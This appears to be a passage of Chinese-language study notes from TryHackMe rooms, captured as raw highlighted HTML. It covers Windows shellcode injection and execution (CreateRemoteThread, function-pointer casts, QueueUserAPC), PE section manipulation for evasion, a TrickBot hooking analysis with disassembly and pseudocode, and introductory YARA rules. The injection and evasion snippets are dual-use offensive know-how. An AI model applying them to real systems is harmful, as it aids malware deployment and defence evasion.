class="line"><span style="color: #ABB2BF">        DWORD error_code </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetLastError</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;CreateRemoteThread failed. Error Code: </span><span style="color: #D19A66">%lu</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">, error_code);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">CloseHandle</span><span style="color: #ABB2BF">(hProcess);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h2 id="Memory-Execution-Alternatives-内存执行替代"><a href="#Memory-Execution-Alternatives-内存执行替代" class="headerlink" title="Memory Execution Alternatives 内存执行替代"></a>Memory Execution Alternatives 内存执行替代</h2><p>根据处于环境的不同，可能需要更改执行 shellcode 的方式。这通常发生在有些 API 被 Hook 了，但是没法绕过他，或者 EDR 在监视线程。</p><p>目前为止，我们已经研究了在本地&#x2F;远程进程之间分配和写入数据的方法，执行也是任何注入技术中的关键一步；尽管在尝试最小化内存痕迹和 IOC 时，它并不那么重要。与分配和写入数据不同，执行有许多选项可供选择。前面几个任务我们通过 <code>CreateThread</code> 和 <code>CreateRemoteThread</code> 方法执行 shellcode 过，这里介绍另外三种执行方法。</p><h3 id="Invoking-Function-Pointers-调用函数指针"><a href="#Invoking-Function-Pointers-调用函数指针" class="headerlink" title="Invoking Function Pointers 调用函数指针"></a>Invoking Function Pointers 调用函数指针</h3><p>这种方法的核心在于利用 C 语言的特性，将一个<strong>内存地址</strong>强制转换为函数指针，并直接调用。它<strong>不依赖额外的 API 调用来执行</strong>，但代码所在的内存区域<strong>必须是可执行的</strong>。虽然最常用于本地分配的内存，但在远程进程中，如果能获取到正确的地址并修改该进程的寄存器，理论上也可以利用。</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">((</span><span style="color: #C678DD">void</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">)())addressPointer)();</span></span></code></pre></div></div></figure><ol><li><code>(void(*)())</code>。这是一个类型转换。它将后面的 <code>addressPointer</code> 强制转换成一个<strong>函数指针类型</strong>。<ol><li><code>*</code>: 表示这是一个指针。</li><li><code>()</code>: 括号中的内容描述了该指针指向的函数的类型。</li><li><code>void</code>: 括号前面的 <code>void</code> 表示该函数没有返回值。</li><li><code>()</code>: 括号里面的 <code>()</code> 表示该函数没有参数。</li></ol></li><li><code>addressPointer</code> 是一个变量，它包含了你想要执行的代码的<strong>内存地址</strong>。通常，这个地址是在内存中动态分配或加载的。</li><li><code>()</code> 是<strong>函数调用操作符</strong></li></ol><p>整个过程就是将一个内存地址（<code>addressPointer</code>）强制视为一个没有参数和返回值的函数，然后立即调用它。</p><p>这种技术的使用场景非常特殊，但在需要时会非常隐蔽和有用。</p><h3 id="Asynchronous-Procedure-Calls-异步过程调用"><a href="#Asynchronous-Procedure-Calls-异步过程调用" class="headerlink" title="Asynchronous Procedure Calls 异步过程调用"></a>Asynchronous Procedure Calls 异步过程调用</h3><ul><li><a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">Asynchronous Procedure Calls</a></li></ul><p>Asyncrhonous Procedure Calls (APC) 是一种在指定线程中异步执行函数的机制。</p><p>简单来说，APC 就像是把你的恶意代码加入一个队列。当目标线程进入一个<strong>可警报状态（alertable state）</strong>时，它就会从队列中取出并执行你的代码，从而劫持线程的执行流。</p><p>APC 函数通过 <code>QueueUserAPC</code> 排队到线程。一旦排队成功，APC 函数就会导致一个软件中断，并在线程下一次被调度时执行该函数。为了让用户模式应用程序将 APC 函数排入队列，目标线程必须处于“可警报状态”。</p><p>可警报状态通常指的是线程正在执行一个等待函数，比如 <code>WaitForSingleObject</code> 或 <code>Sleep</code>。</p><p>这里我们假设已经把我们的 Shellcode 写入到内存了，<code>addressPointer</code> 是我们写入好的内存地址，<code>pinfo</code> 是获取到的 <code>PROCESS_INFORMATION</code> 结构体。</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">QueueUserAPC</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">PAPCFUNC</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75; font-style: italic">addressPointer</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // APC 函数指针，指向我们已注入的 Shellcode 地址</span></span><span class="line"><span style="color: #E06C75">pinfo.hThread</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic">            // 目标线程的句柄，从 PROCESS_INFORMATION 结构体获取</span></span><span class="line"><span style="color: #E06C75"></span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">ULONG_PTR</span><span style="color: #ABB2BF">)</span><span style="color: #D19A66">NULL</span><span style="color: #7F848E; font-style: italic">           // 传递给 APC 函数的参数，这里为空</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 恢复线程执行</span></span><span class="line"><span style="color: #61AFEF">ResumeThread</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #E06C75">pinfo.hThread</span><span style="color: #7F848E; font-style: italic"> // 目标线程的句柄</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 等待线程执行完毕</span></span><span class="line"><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #E06C75">pinfo.hThread</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 目标线程的句柄</span></span><span class="line"><span style="color: #E06C75">INFINITE</span><span style="color: #7F848E; font-style: italic">       // 无限等待，直到线程结束或被唤醒</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><h3 id="Section-Manipulation-节区操作"><a href="#Section-Manipulation-节区操作" class="headerlink" title="Section Manipulation 节区操作"></a>Section Manipulation 节区操作</h3><p>这个技术的核心是直接修改 <strong>PE (Portable Executable)</strong> 文件的内部结构，而不是简单地对代码进行加密或混淆。PE 文件是 Windows 可执行文件的基本格式，由不同的<strong>节区 (Sections)</strong> 组成，比如存放代码的 <code>.text</code> 节和存放数据的 <code>.data</code> 节。</p><ol><li><p>**PE 文件转储 (PE Dump)**：首先，攻击者需要用工具（如 <code>xxd</code>）将恶意文件（如 DLL 或 Shellcode）的原始二进制数据提取出来。</p></li><li><p><strong>数学运算</strong>：然后，利用复杂的数学运算，计算出代码和数据在 PE 文件中的**相对虚拟地址 (RVA)**，这是 PE 文件中用来定位内容的相对偏移量。</p></li><li><p><strong>高级技术</strong>：利用这些 RVA，攻击者可以采用更精妙的手段来隐藏恶意代码：</p><ul><li><p><strong>RVA 入口点解析</strong>：修改 PE 文件头的入口点，将其指向恶意代码，从而让系统在加载文件时直接执行注入的代码。</p></li><li><p><strong>节区映射</strong>：在 PE 文件中创建新的节区，或修改现有节区的权限，以容纳恶意代码。</p></li><li><p><strong>重定位表解析</strong>：修改重定位表，确保注入的代码在程序加载到内存中的任意地址时都能正常运行。</p></li></ul></li></ol><p><strong>与常见混淆技术的区别</strong></p><p>与常见的 <strong>XOR 或 Base64 加密</strong>等混淆技术相比，节区操作是一种更底层、更高级的防御规避手段。</p><ul><li><strong>混淆&#x2F;加密</strong>：改变的是代码的<strong>外观</strong>，以躲避杀毒软件的签名检测。</li><li><strong>节区操作</strong>：改变的是文件的<strong>内部结构和物理布局</strong>，旨在欺骗静态和动态分析工具，让恶意代码看起来像是文件本身的一个合法部分。</li></ul><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><p>来自 <a href="https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/"><em>SentinelLabs</em></a> 的报告，这是一个 TrickBot 的 TTP 的分析报告。</p><p>TrickBot 是最近在金融犯罪软件领域重新流行起来的一种著名的银行恶意软件。</p><p>这里我们分析的是这个恶意软件的 Hook 浏览器的功能，他能 Hook 浏览器的 API 去拦截和窃取凭据。</p><p>我们先来看看它们是如何针对浏览器的。这段反汇编代码显示了 <code>push offset</code> 指令，这表明在调用 <code>OpenProcess</code> 之前，恶意软件正在将不同的浏览器可执行文件名（<code>chrome.exe</code>, <code>iexplore.exe</code>, <code>firefox.exe</code> 等）作为参数压入堆栈，以便逐一尝试打开它们。这表明了 TrickBot 在寻找一个可注入的目标。你的分析是正确的，它通过 <code>OpenProcess</code> 来获取浏览器进程的句柄。</p><figure class="shiki assembly"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre><code>push   eaxpush   0push   438hcall   ds:OpenProcessmov    edi, eaxmov    [edp,hProcess], editest   edi, edijz     loc_100045EE--------------------------------push   offset Srch            ; "chrome.exe"lea    eax, [ebp+pe.szExeFile]...mov    eax, ecxpush   offset aIexplore_exe   ; "iexplore.exe"push   eax                    ; lpFirst...mov    eax, ecxpush   offset aFirefox_exe   ; "firefox.exe"push   eax                    ; lpFirst...mov    eax, ecxpush   offset aMicrosoftedgec   ; "microsoftedgecp.exe"...</code></pre></div></div></figure><p>反射性注入的当前源代码尚不明确，但 SentinelLabs 已在下方概述了注入的基本程序流程。</p><ol><li>打开目标进程（<code>OpenProcess</code>）</li><li>分配内存（<code>VirtualAllocEx</code>）</li><li>复制<strong>钩子安装程序</strong>到分配的内存里（<code>WriteProcessMemory</code>）</li><li>复制 <strong>Shellcode</strong> 到分配的内存里（<code>WriteProcessMemory</code>）</li><li>刷新缓存（<code>FlushInstructionCache</code>）</li><li><strong>创建远程线程</strong>，让它去执行<strong>钩子安装程序</strong>（<code>CreateRemoteThread</code>）。</li><li>该新线程在执行钩子安装程序后，可能会<strong>创建一个新线程</strong>（<code>RtlCreateUserThread</code>）或恢复被挂起的线程。</li></ol><p>一旦注入，TrickBot 将调用其钩子安装程序函数，该函数已在第三步复制到内存中。SentinelLabs 在下方提供了安装程序函数的伪代码。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 计算我们恶意函数和原始函数中的偏移量</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// + 1 是跳过 jmp 直接访问后面的 32 位偏移量</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 这里的 -5 是用来抵消跳转指令本身的长度</span></span><span class="line"><span style="color: #ABB2BF">relative_offset </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> myHook_function </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">(_DWORD </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">)(original_function </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">5</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 获取要被覆盖的原始指令的长度</span></span><span class="line"><span style="color: #ABB2BF">v8 </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> __int8)</span><span style="color: #E5C07B">original_function</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">5</span><span style="color: #ABB2BF">];</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 记住原来函数所在的地址 + 1 是为了跳过 jmp 直接访问后面的 32 位偏移量</span></span><span class="line"><span style="color: #ABB2BF">trampoline_lpvoid </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">**</span><span style="color: #ABB2BF">)(original_function </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// &quot;0xE9&quot; 是跳转指令的机器码，即 jmp</span></span><span class="line"><span style="color: #ABB2BF">jmp_32_bit_relative_offset_opcode </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">E9</span><span style="color: #E06C75">u</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 修改内存页的保护属性 让代码能写入这块内存</span></span><span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> ( </span><span style="color: #61AFEF">VirtualProtectEx</span><span style="color: #ABB2BF">((HANDLE)</span><span style="color: #E06C75">0x</span><span style="color: #D19A66">FFFFFFFF</span><span style="color: #ABB2BF">, trampoline_lpvoid, v8, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">40</span><span style="color: #E06C75">u</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">flOldProtect) )</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 这一部分没看明白 original_function 我不知道是什么</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 很可能是指浏览器中被钩子劫持的那个原始 API 函数</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 写入内存只有下面那一个方法，而且写的是 opcode</span></span><span class="line"><span style="color: #ABB2BF">v10 </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">(_DWORD </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">)(original_function </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">v11 </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> __int8)</span><span style="color: #E5C07B">original_function</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">5</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> (_DWORD)original_function </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">47</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">original_function</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">66</span><span style="color: #ABB2BF">] </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">E9</span><span style="color: #E06C75">u</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 这里相当于 original_function[67]</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">(_DWORD </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">)(original_function </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">43</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> v10 </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> v11;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 手动写入内存</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">write_hook_iter</span><span style="color: #ABB2BF">(v10, </span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">jmp_32_bit_relative_offset_opcode, </span><span style="color: #D19A66">5</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 还原原始保护状态</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">VirtualProtectEx</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">(HANDLE)</span><span style="color: #E06C75">0x</span><span style="color: #D19A66">FFFFFFFF</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">(LPVOID </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">)(original_function </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">),</span></span><span class="line"><span style="color: #ABB2BF">(</span><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> __int8)</span><span style="color: #E5C07B">original_function</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">5</span><span style="color: #ABB2BF">],</span></span><span class="line"><span style="color: #ABB2BF">flOldProtect,</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">flOldProtect);</span></span><span class="line"><span style="color: #ABB2BF">result </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure><p>先丢在这里，之后实践的时候再研究。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个房间就涵盖了注入的很多种方式，之前自己也看过一些注入手段，用的是未被公开的 API 来注入，绕过杀毒软件。就算我有这些基础，完成这个房间也是挺困难的，不过房间难度是 Hard，也正常吧。</p><h1 id="Introduction-to-Antivirus"><a href="#Introduction-to-Antivirus" class="headerlink" title="Introduction to Antivirus"></a>Introduction to Antivirus</h1><p>这个房间就简单的介绍了一下杀毒软件，概念性的比较多，后面的 yara 值得学习一下，能理解杀软是如何通过签名鉴定文件是否存在威胁的。</p><p>传统杀毒软件通过记录的文件指纹来查找恶意软件，现代杀毒软件通过整合多种技术，从静态到动态，构建了一个全面的防御体系，以识别和拦截不断演变的恶意软件。</p><p><strong>1. 核心：多层级检测</strong></p><ul><li><strong>静态检测（Signature-Based）</strong>：这是最基础的防线。它通过<strong>模式匹配</strong>，在恶意文件被执行之前，就扫描其独特的<strong>文件指纹</strong>（如哈希值、特定字节序列或字符串）。这种方式速度快，但容易被简单的文件修改（如加壳、混淆）绕过。</li><li><strong>启发式检测（Heuristic）</strong>：为了弥补静态检测的不足，启发式分析会根据代码的<strong>行为模式</strong>来判断其恶意性。例如，一个程序在没有用户交互的情况下试图访问系统关键区域，就可能被标记为可疑。</li><li><strong>动态检测（Behavioral）</strong>：这是最高级的防御层。杀毒软件会将可疑文件放入一个隔离的**沙箱（Sandbox）**环境中执行，并**模拟**其所有行为。通过监控以下活动来识别恶意意图：<ul><li><strong>API 调用</strong>：是否调用了危险的系统函数，如创建新进程、修改注册表等。</li><li><strong>文件系统修改</strong>：是否试图删除、修改或加密用户文件。</li><li><strong>网络请求</strong>：是否试图连接到可疑的命令与控制服务器。</li></ul></li></ul><p><strong>2. 辅助功能：处理复杂威胁</strong></p><ul><li><strong>解压&#x2F;解包（Decompression&#x2F;Unpacking）</strong>：许多恶意软件会使用加壳或加密技术来隐藏其真实代码。杀毒软件的解包器能够<strong>还原</strong>这些文件，暴露其原始代码，以便进行静态分析。</li><li><strong>模拟器（Emulator）</strong>：模拟器是沙箱的核心组件，它在不影响真实系统的情况下，运行和分析恶意代码的每一个指令，从而发现其隐藏的行为。</li></ul><h2 id="静态检测"><a href="#静态检测" class="headerlink" title="静态检测"></a>静态检测</h2><p>静态检测技术是最简单的杀毒软件检测类型，它基于恶意文件的预定义签名。简单来说，它在检测中使用模式匹配技术，例如查找唯一的字符串、CRC（校验和）、字节码&#x2F;十六进制值序列以及加密哈希（MD5、SHA1 等）。</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>快捷看 Hash 工具 <a href="https://github.com/namazso/OpenHashTab">OpenHashTab</a> 资源管理器集成，挺方便的</p><p>PEiD 看打包器 文件实际类型 文件头：<a href="https://filesig.search.org/">https://filesig.search.org/</a></p><p>这里用到的是一个 yara 工具，一个很强大的自定义静态扫描工具</p><h2 id="Yara"><a href="#Yara" class="headerlink" title="Yara"></a>Yara</h2><p>这里是去 Yara 房间里面学习了一下，不是这个房间的内容，但是强烈建议去学一遍再回来。</p><p>Room：<a href="https://tryhackme.com/room/yara">https://tryhackme.com/room/yara</a></p><h3 id="Yara-入门"><a href="#Yara-入门" class="headerlink" title="Yara 入门"></a>Yara 入门</h3><p>在恶意软件中可能会有一些特征字符串，比如说虚拟币钱包地址，IP 地址，这种就可以作为敏感信息去检测他，而 Yara 就是根据文件呈现的特征或模式来确定文件是否恶意。</p><p>yara 命令需要两个参数才能生效，一个是规则文件，一个是目标（要使用该规则的文件名、目录或进程 ID）。</p><h3 id="Yara-规则"><a href="#Yara-规则" class="headerlink" title="Yara 规则"></a>Yara 规则</h3><p><a href="https://yara.readthedocs.io/en/stable/writingrules.html">https://yara.readthedocs.io/en/stable/writingrules.html</a></p><h4 id="Meta-元数据"><a href="#Meta-元数据" class="headerlink" title="Meta 元数据"></a>Meta 元数据</h4><p>Yara 规则的这一部分是为规则作者的描述性信息保留的。例如，您可以使用 <code>description</code>（<code>desc</code> 的缩写）来总结您的规则检查的内容。此部分中的任何内容都不会影响规则本身。类似于代码注释，总结您的规则很有用。</p><h4 id="Strings-字符串"><a href="#Strings-字符串" class="headerlink" title="Strings 字符串"></a>Strings 字符串</h4><p>你可以使用字符串在文件或程序中搜索特定的文本或十六进制。例如，假设我们想在一个目录中搜索所有包含“Hello World!”的文件，我们可以创建一个规则，如下所示：</p><figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">rule helloworld_checker{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">strings</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #98C379">$hello_world = &quot;Hello World!&quot;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>我们定义关键字 <code>Strings</code> ，其中我们想要搜索的字符串，即“Hello World!”，存储在变量 <code>$hello_world</code> 中。</p><p>当然，我们需要一个条件来使规则生效。在这个例子中，要使这个字符串成为条件，我们需要使用变量名。在这种情况下， <code>$hello_world</code> ：</p><figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">rule helloworld_checker{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">strings</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #98C379">$hello_world = &quot;Hello World!&quot;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">condition</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #98C379">$hello_world</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>本质上，如果任何文件包含字符串“Hello World!”，则该规则将匹配。但是，这字面意思是只有找到“Hello World!”时才会匹配，而不会匹配“hello world”或“HELLO WORLD.”。</p><p>要解决此问题，条件 <code>any of them</code> 允许搜索多个字符串，如下所示：</p><figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">rule helloworld_checker{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">strings</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #98C379">$hello_world = &quot;Hello World!&quot;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #98C379">$hello_world_lowercase = &quot;hello world&quot;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #98C379">$hello_world_uppercase = &quot;HELLO WORLD&quot;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">condition</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #98C379">any of them</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h4 id="Conditions-条件"><a href="#Conditions-条件" class="headerlink" title="Conditions 条件"></a>Conditions 条件</h4><p>我们已经使用了 <code>true</code> 和 <code>any of them</code> 条件。与常规编程非常相似，你可以使用以下运算符：</p><ul><li><strong>&lt;&#x3D;</strong> 小于或等于</li><li><strong>&gt;&#x3D;</strong> 大于或等于</li><li><strong>!&#x3D;</strong>  不等于</li></ul><p>下面的规则表示：当“Hello World!”字符串出现次数小于或等于十次时，才表示规则匹配</p><figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">rule helloworld_checker{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">strings</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #98C379">$hello_world = &quot;Hello World!&quot;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">condition</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">#hello_world &lt;= 10</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h4 id="Combining-keywords-组合关键词"><a href="#Combining-keywords-组合关键词" class="headerlink" title="Combining keywords 组合关键词"></a>Combining keywords 组合关键词</h4><ul><li>and</li><li>not</li><li>or</li></ul><p>要组合多个条件。例如，如果你想检查一个文件是否包含某个字符串并且大小符合特定要求（在本例中，我们检查的样本文件小于 10 KB 且包含“Hello World!”），你可以使用如下规则：</p><figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">rule helloworld_checker{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">strings</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #98C379">$hello_world = &quot;Hello World!&quot;</span><span style="color: #ABB2BF"> </span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">condition</span><span style="color: #ABB2BF">:</span></span><span class="line"><span 